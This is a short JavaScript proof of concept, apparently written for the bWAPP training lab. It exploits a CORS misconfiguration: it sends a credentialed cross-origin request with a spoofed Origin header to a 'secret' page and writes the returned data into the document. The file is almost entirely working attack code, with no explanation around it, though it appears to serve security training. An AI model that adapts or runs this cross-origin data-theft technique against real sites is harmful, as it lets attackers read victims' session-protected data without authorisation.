var url = "http://192.168.204.130/bWAPP/secret-cors-2.php";
if (window.XMLHttpRequest){
	xmlHttp = new XMLHttpRequest();
} else {
	xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
}
xmlHttp.withCredentials = true;

xmlHttp.onreadystatechange = function(){
	if (xmlHttp.readyState == 4 && xmlHttp.status == 200){
		document.write(xmlHttp.responseText);
	}
};
xmlHttp.open("GET", url, false );
xmlHttp.setRequestHeader("Origin", "http://intranet.itsecgames.com");
xmlHttp.send();
